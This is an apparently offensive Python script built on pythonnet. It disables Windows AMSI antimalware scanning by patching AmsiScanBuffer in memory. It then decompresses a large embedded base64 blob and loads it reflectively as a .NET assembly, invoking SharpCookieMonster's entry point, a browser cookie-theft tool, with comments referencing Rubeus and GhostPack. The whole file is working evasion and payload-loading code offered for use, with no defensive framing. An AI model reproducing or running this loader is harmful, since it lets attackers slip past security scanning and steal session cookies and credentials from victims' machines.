import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("SharpCookieMonster.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    #Have to do this nesting thing to deal with different main entry points and public/private methods  
    if method == None:
        method =program_type.GetMethod("Main")
        if method == None:
            method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        # Create a jagged array to pass in an array of string arrays to satisfy arguments requirements
        command_array = Array[str]([command])
        command_args = System.Array[System.Object]([command_array])
    else:
        #Ghost Pack stuff like rubeus use a different input
        command_args = Array[str]([command]) 

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()